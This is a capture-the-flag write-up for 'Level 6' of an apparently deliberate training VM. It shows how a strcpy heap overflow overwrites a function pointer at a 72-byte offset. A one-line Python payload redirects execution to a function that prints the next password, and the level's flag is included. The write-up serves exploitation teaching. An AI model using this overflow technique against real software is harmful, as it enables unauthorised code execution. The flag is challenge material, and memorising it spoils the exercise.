# Level 6

## Connect to the virtual machine with SSH

Use the flag from `level5` as the `level6` password:

```bash
ssh level6@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level6@127.0.0.1:/home/user/level6/level6 ./level6/
```

The extracted binary is saved as `level6/level6`.

## Copy the GDB dump to the host

Inside the VM, connected as `level6`, open the binary with GDB:

```bash
gdb ./level6
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level6_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas n
disas m
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level6@127.0.0.1:/tmp/level6_main_dump_gdb ./level6/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble n" \
  -ex "disassemble m" \
  ./level6/level6 > ./level6/level6_main_dump_gdb
```

## Analyze the GDB dump

`main` allocates two chunks on the heap:

```asm
0x08048485 <+9>:  mov    DWORD PTR [esp],0x40
0x0804848c <+16>: call   0x8048350 <malloc@plt>
0x08048491 <+21>: mov    DWORD PTR [esp+0x1c],eax
0x08048495 <+25>: mov    DWORD PTR [esp],0x4
0x0804849c <+32>: call   0x8048350 <malloc@plt>
0x080484a1 <+37>: mov    DWORD PTR [esp+0x18],eax
```

The first allocation is `0x40`, so it reserves 64 bytes for user input. The
second allocation is 4 bytes and stores a function pointer.

The function pointer is first initialized with the address of `m`:

```asm
0x080484a5 <+41>: mov    edx,0x8048468
0x080484aa <+46>: mov    eax,DWORD PTR [esp+0x18]
0x080484ae <+50>: mov    DWORD PTR [eax],edx
```

Then `argv[1]` is copied into the first heap chunk with `strcpy`:

```asm
0x080484b0 <+52>: mov    eax,DWORD PTR [ebp+0xc]
0x080484b3 <+55>: add    eax,0x4
0x080484b6 <+58>: mov    eax,DWORD PTR [eax]
0x080484ba <+62>: mov    eax,DWORD PTR [esp+0x1c]
0x080484c5 <+73>: call   0x8048340 <strcpy@plt>
```

`strcpy` has no length check. If `argv[1]` is longer than the first allocation,
it overflows into the next heap chunk and can overwrite the function pointer.

Finally, the program calls the function pointer:

```asm
0x080484ca <+78>: mov    eax,DWORD PTR [esp+0x18]
0x080484ce <+82>: mov    eax,DWORD PTR [eax]
0x080484d0 <+84>: call   eax
```

There are two relevant functions:

```asm
0x08048454 <n>: runs /bin/cat /home/user/level7/.pass
0x08048468 <m>: prints "Nope"
```

So the goal is to overwrite the function pointer from:

```text
0x08048468
```

to:

```text
0x08048454
```

## Find the exact heap offset

Do not guess the distance between the two heap chunks. Ask GDB after both
`malloc` calls have returned:

```gdb
break *main+41
run AAAA
p/x *(void **)($esp+0x1c)
p/x *(void **)($esp+0x18)
p/d *(void **)($esp+0x18)-*(void **)($esp+0x1c)
```

Result:

```text
Breakpoint 1, 0x080484a5 in main ()
$1 = 0x804a008
$2 = 0x804a050
$3 = 72
```

So:

```text
second allocation - first allocation = 0x0804a050 - 0x0804a008 = 72
```

The function pointer starts 72 bytes after the beginning of the first heap
buffer.

## Exploitation

Payload layout:

```text
72 bytes of padding + address of n()
```

`n` is at:

```text
0x08048454
```

Written in little endian:

```text
\x54\x84\x04\x08
```

Run this in the VM:

```bash
/home/user/level6/level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```

The binary calls the overwritten function pointer and prints the next password.

## Flag

```text
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
